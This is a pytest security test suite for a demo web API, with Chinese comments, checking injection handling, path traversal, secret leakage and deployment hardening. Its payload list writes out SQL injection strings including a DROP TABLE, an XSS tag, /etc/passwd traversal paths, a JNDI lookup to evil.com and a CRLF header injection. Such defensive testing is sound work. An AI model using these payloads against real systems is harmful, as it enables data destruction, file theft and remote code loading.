"""安全基线测试：注入、越权、信息泄露与配置硬化。

定位说明
--------
本项目当前为 **demo 模式内网演示**，无鉴权、CORS 全开是已知且被接受的现状。
因此安全测试分两类：

1. **必须通过的红线**：SQL 注入、路径穿越、异常堆栈泄露、密钥泄露、
   ORM 参数化 —— 这些与是否鉴权无关，任何模式下都不能失守。
2. **上线前门禁（xfail 标记）**：鉴权缺失、CORS 全开、DEBUG 开启。
   当前预期失败，作为「上线前必须转绿」的清单固化在测试里，
   避免带病上线时无人察觉。

对应用例编号：SEC-*
"""
from __future__ import annotations

import re

import pytest

pytestmark = pytest.mark.security

# 常见 SQL 注入 / XSS / 路径穿越载荷
INJECTION_PAYLOADS = [
    "1' OR '1'='1",
    "1; DROP TABLE news;--",
    "' UNION SELECT sqlite_version()--",
    "%27%20OR%201%3D1--",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "${jndi:ldap://evil.com/a}",
    "%00",          # URL 编码的空字节
    "%0d%0aSet-Cookie:x=1",  # CRLF 响应拆分
]


# ============================================================
# SEC-01x 注入与越权（红线，必须通过）
# ============================================================
@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_query_param_injection_is_harmless(client, payload, db):
    """SEC-011 异常容错：查询参数注入不得造成 5xx、不得破坏数据。"""
    from sqlalchemy import func, select
    from app.models.database import News

    before = db.execute(select(func.count(News.id))).scalar()
    for url in (
        f"/api/v1/market/price?range_hours={payload}",
        f"/api/v1/stats/accuracy?window={payload}",
        f"/api/v1/news?limit={payload}",
        f"/api/v1/hawk-dove/events?days={payload}",
    ):
        r = client.get(url)
        assert r.status_code < 500, f"{url} 触发 5xx: {r.status_code}"
    db.expire_all()
    after = db.execute(select(func.count(News.id))).scalar()
    assert before == after, "注入载荷改变了数据量，存在注入风险"


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_body_injection_is_harmless(client, payload):
    """SEC-012 异常容错：请求体注入不得造成 5xx。"""
    r = client.post("/api/v1/backtest/run", json={"start_date": payload, "end_date": payload})
    assert r.status_code < 500, f"请求体注入触发 5xx: {r.text[:200]}"


def test_orm_uses_parameterized_query(client, db):
    """SEC-013 正常流程：ORM 参数化生效——含引号的参数被当作字面量而非 SQL。"""
    from sqlalchemy import text

    # 直接验证驱动层绑定参数不拼接
    row = db.execute(text("SELECT :v AS v"), {"v": "1' OR '1'='1"}).scalar()
    assert row == "1' OR '1'='1"
    # 表仍然存在（未被 DROP）
    n = db.execute(text("SELECT COUNT(*) FROM news")).scalar()
    assert n > 0


@pytest.mark.parametrize("path", [
    "/../.env", "/..%2f.env", "/static/../app/config.py",
    "/dashboard.html/../../.env", "/etc/passwd",
])
def test_path_traversal_blocked(client, path):
    """SEC-014 异常容错：路径穿越取不到任何服务端文件。"""
    r = client.get(path)
    assert r.status_code in (307, 400, 404, 405), f"{path} -> {r.status_code}"
    if r.status_code == 200:
        assert "OPENAI_API_KEY" not in r.text and "DATABASE_URL" not in r.text


# ============================================================
# SEC-02x 信息泄露（红线，必须通过）
# ============================================================
def test_no_stacktrace_in_error_response(client):
    """SEC-021 异常容错：错误响应不得回显 Python 堆栈或文件路径。"""
    suspicious = ("Traceback", "site-packages", "/Users/", "sqlalchemy.exc", "File \"")
    for url in ("/api/v1/news?limit=abc", "/api/v1/notfound", "/api/v1/hawk-dove/events?days=-1"):
        text_body = client.get(url).text
        for s in suspicious:
            assert s not in text_body, f"{url} 泄露内部信息「{s}」"


def test_no_secret_in_any_response(client):
    """SEC-022 正常流程：任何接口响应都不得包含密钥、连接串等敏感信息。"""
    patterns = [
        re.compile(r"sk-[A-Za-z0-9]{16,}"),          # OpenAI 风格密钥
        re.compile(r"postgresql://[^\s\"']+:[^\s\"']+@"),  # 带口令的连接串
        re.compile(r"OPENAI_API_KEY\s*[=:]"),
    ]
    urls = [
        "/api/v1/system/status", "/api/v1/system/data-sources",
        "/api/v1/signals/latest", "/api/v1/factors", "/api/v1/news?limit=20",
        "/openapi.json",
    ]
    for url in urls:
        body = client.get(url).text
        for pat in patterns:
            assert not pat.search(body), f"{url} 疑似泄露敏感信息（模式 {pat.pattern}）"


def test_system_status_does_not_expose_db_path(client):
    """SEC-023 边界值：系统状态只回显数据库**类型**，不得回显文件绝对路径。"""
    st = client.get("/api/v1/system/status").json()["data"]
    blob = str(st)
    assert "/Users/" not in blob and ".db" not in blob.replace("db_type", ""), (
        f"系统状态泄露数据库路径: {st.get('db_connection')}")


def test_env_example_has_no_real_secret(project_root):
    """SEC-024 正常流程：.env.example 只能是占位，不得提交真实密钥。"""
    p = project_root / ".env.example"
    content = p.read_text(encoding="utf-8")
    for line in content.splitlines():
        if line.strip().startswith("#") or "=" not in line:
            continue
        key, _, value = line.partition("=")
        if any(t in key.upper() for t in ("KEY", "SECRET", "TOKEN", "PASSWORD")):
            assert value.strip() in ("", '""'), f"{key} 疑似写入真实密钥"


def test_git_ignores_sensitive_files(project_root):
    """SEC-025 正常流程：.gitignore 覆盖 .env、数据库文件与虚拟环境。"""
    ignore = (project_root / ".gitignore").read_text(encoding="utf-8")
    for pattern in (".env", ".venv"):
        assert pattern in ignore, f".gitignore 未忽略 {pattern}"
    # 数据库文件：直接忽略 *.db 或整体忽略 data/ 目录均可
    assert "*.db" in ignore or "data/" in ignore, ".gitignore 未忽略数据库文件"
    # 测试产物不得入库
    for pattern in (".pytest_tmp", "reports/"):
        assert pattern in ignore, f".gitignore 未忽略测试产物 {pattern}"


# ============================================================
# SEC-03x 上线前门禁（当前预期失败，修复后自动转 XPASS）
# ============================================================
@pytest.mark.xfail(reason="DEF-004：demo 模式无鉴权，上线前必须补 API Key / JWT", strict=False)
def test_api_requires_authentication(client):
    """SEC-031 安全门禁：未携带凭据访问业务接口应返回 401/403。"""
    r = client.get("/api/v1/signals/latest")
    assert r.status_code in (401, 403), "接口当前完全开放，无任何鉴权"


@pytest.mark.xfail(reason="DEF-005：CORS allow_origins=['*']，上线前必须收敛白名单", strict=False)
def test_cors_origin_is_restricted(client):
    """SEC-032 安全门禁：跨域白名单不应为 `*`。"""
    r = client.get("/api/v1/factors", headers={"Origin": "https://evil.example.com"})
    allow = r.headers.get("access-control-allow-origin", "")
    assert allow != "*" and "evil.example.com" not in allow, f"CORS 过宽: {allow}"


@pytest.mark.xfail(reason="DEF-006：缺少安全响应头（CSP/HSTS/X-Frame-Options）", strict=False)
def test_security_headers_present(client):
    """SEC-033 安全门禁：应返回基础安全响应头。"""
    h = {k.lower() for k in client.get("/dashboard.html").headers}
    for expected in ("content-security-policy", "x-content-type-options", "x-frame-options"):
        assert expected in h, f"缺少安全响应头 {expected}"


@pytest.mark.xfail(reason="DEF-007：无限流，接口可被无限刷", strict=False)
def test_rate_limiting_enabled(client):
    """SEC-034 安全门禁：短时间高频请求应触发 429 限流。"""
    codes = {client.get("/api/v1/factors").status_code for _ in range(120)}
    assert 429 in codes, "未观察到限流"


def test_debug_disabled_in_test_env(client):
    """SEC-035 正常流程：非开发环境 DEBUG 必须关闭（防堆栈泄露）。"""
    from app.config import settings

    assert settings.debug is False, "测试/生产环境不得开启 DEBUG"
